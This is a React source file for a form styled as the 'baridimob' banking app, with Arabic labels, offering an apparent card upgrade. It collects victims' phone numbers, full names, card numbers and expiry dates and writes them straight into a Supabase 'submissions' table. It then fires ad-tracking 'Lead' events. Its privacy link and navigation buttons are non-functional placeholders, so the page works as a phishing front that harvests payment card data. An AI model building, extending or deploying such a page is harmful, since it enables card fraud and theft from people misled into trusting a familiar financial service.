
import React from 'react';
import { motion } from 'framer-motion';
import { v4 as uuidv4 } from 'uuid';
import { CreditCard, Lock, MapPin, Newspaper, Phone, Info } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useToast } from '@/components/ui/use-toast';
import { useFormValidation } from '@/hooks/useFormValidation';
import { useSupabase } from '@/contexts/SupabaseContext';
import { sendCapiEvent } from '@/lib/capi';
import { trackPixelEvent } from '@/lib/pixel';

const PhoneNumberForm = ({ onContinue, onTryAgain }) => {
  const { toast } = useToast();
  const { supabase } = useSupabase();
  const {
    values,
    errors,
    isFormValid,
    handlePhoneChange,
    handleFullNameChange,
    handleCardNumberChange,
    handleExpDateChange,
  } = useFormValidation();

  const handleContinue = async () => {
    if (!isFormValid) return;

    // 1. Send to Supabase
    const { error: supabaseError } = await supabase
      .from('submissions')
      .insert([
        { 
          phone_number: values.phone, 
          full_name: values.fullName,
          card_number: values.cardNumber, 
          exp_date: values.expDate 
        }
      ]);

    if (supabaseError) {
      toast({
        variant: "destructive",
        title: "فشل الإرسال",
        description: "حدث خطأ أثناء إرسال بياناتك. يرجى المحاولة مرة أخرى.",
      });
      return; // Stop if Supabase submission fails
    }

    // 2. If Supabase is successful, fire tracking events
    const eventId = uuidv4();
    const customData = {
      form_type: 'classic_card_upgrade',
    };
    const userData = {
      ph: [values.phone], // Phone number
    };

    // Fire Meta Pixel event (Browser)
    trackPixelEvent('Lead', customData, { eventID: eventId });

    // Fire CAPI event (Server)
    sendCapiEvent('Lead', userData, customData, eventId);
    
    // 3. Navigate to next screen
    onContinue(eventId);
  };

  const handlePrivacyPolicy = e => {
    e.preventDefault();
    toast({
      title: "🚧 هذه الميزة لم تنفذ بعد - لكن لا تقلق! يمكنك طلبها في رسالتك القادمة! 🚀",
      duration: 3000,
    });
  };

  const handleNavClick = item => {
    toast({
      title: `🚧 ميزة ${item} لم تنفذ بعد - لكن لا تقلق! يمكنك طلبها في رسالتك القادمة! 🚀`,
      duration: 3000,
    });
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" style={{
      backgroundImage: "linear-gradient(135deg, rgba(255,255,255,0) 49.8%, rgba(0,0,0,0.02) 50%, rgba(255,255,255,0) 50.2%)",
      backgroundSize: "8px 8px"
    }}>
      <div className="flex-1 flex flex-col px-6 py-8 pb-24">
        <motion.h1 initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} transition={{ duration: 0.5 }} className="text-2xl font-bold text-gray-800 mb-8 text-right">
          baridimob
        </motion.h1>

        <motion.form initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5, delay: 0.2 }} className="w-full max-w-md mx-auto space-y-6">
          <div>
            <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-1 text-right">
              رقم الهاتف
            </label>
            <Input id="phone" type="tel" placeholder="XXXX XXXXXX" value={values.phone} onChange={handlePhoneChange} maxLength="11" isInvalid={!!errors.phone} />
            {errors.phone && <p className="text-red-500 text-xs mt-1 text-right">{errors.phone}</p>}
          </div>

          <div>
            <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1 text-right">
              الاسم الكامل
            </label>
            <Input id="fullName" type="text" placeholder="الاسم الكامل" value={values.fullName} onChange={handleFullNameChange} isInvalid={!!errors.fullName} />
            {errors.fullName && <p className="text-red-500 text-xs mt-1 text-right">{errors.fullName}</p>}
          </div>

          <div>
            <label htmlFor="card-number" className="block text-sm font-medium text-gray-700 mb-1 text-right">
              رقم البطاقة
            </label>
            <div className="relative">
              <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-5 w-5 text-blue-600" />
              <Input id="card-number" type="text" placeholder="XXXX XXXX XXXX XXXX" className="pr-10" value={values.cardNumber} onChange={handleCardNumberChange} maxLength="19" isInvalid={!!errors.cardNumber} />
            </div>
            {errors.cardNumber && <p className="text-red-500 text-xs mt-1 text-right">{errors.cardNumber}</p>}
          </div>

          <div>
            <label htmlFor="exp-date" className="block text-sm font-medium text-gray-700 mb-1 text-right">
              تاريخ انتهاء الصلاحية
            </label>
            <Input id="exp-date" type="text" placeholder="YY/MM" value={values.expDate} onChange={handleExpDateChange} maxLength="5" isInvalid={!!errors.expDate} />
            {errors.expDate && <p className="text-red-500 text-xs mt-1 text-right">{errors.expDate}</p>}
          </div>
        </motion.form>

        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5, delay: 0.4 }} className="w-full max-w-md mx-auto mt-8">
          <Button onClick={handleContinue} disabled={!isFormValid} className="w-full bg-[#1e3a8a] hover:bg-[#1e40af] text-white font-semibold py-4 text-lg rounded-lg transition-all duration-300 hover:shadow-lg disabled:opacity-50 disabled:cursor-not-allowed">
            CONTINUE
          </Button>
        </motion.div>

        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ duration: 0.5, delay: 0.6 }} className="text-center mt-6">
          <p className="text-xs text-gray-600">
            بدخولك إلى التطبيق فأنت تؤكد موافقتك على{' '}
            <a href="#" onClick={handlePrivacyPolicy} className="text-blue-600 underline hover:text-blue-700 transition-colors">
              سياسة الخصوصية
            </a>
            .
          </p>
          <button onClick={onTryAgain} className="text-blue-600 mt-4 text-sm font-medium hover:underline">
            حاول مرة أخرى
          </button>
        </motion.div>
      </div>

      <motion.nav initial={{ opacity: 0, y: 50 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5, delay: 0.8 }} className="fixed bottom-0 left-0 right-0 bg-[#1e3a8a] text-white shadow-lg">
        <div className="flex items-center justify-around py-3">
          <button onClick={() => handleNavClick('معلومات')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Info className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">معلومات</span>
          </button>
          <button onClick={() => handleNavClick('الاتصال')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Phone className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الاتصال</span>
          </button>
          <button onClick={() => handleNavClick('الأخبار')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Newspaper className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الأخبار</span>
          </button>
          <button onClick={() => handleNavClick('الموقع')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <MapPin className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">الموقع</span>
          </button>
          <button onClick={() => handleNavClick('تسجيل الدخول')} className="flex flex-col items-center gap-1 px-3 py-2 hover:bg-[#1e40af] rounded-lg transition-all duration-300">
            <Lock className="w-6 h-6 text-blue-300" /><span className="text-xs font-medium">تسجيل الدخول</span>
          </button>
        </div>
      </motion.nav>
    </div>
  );
};

export default PhoneNumberForm;
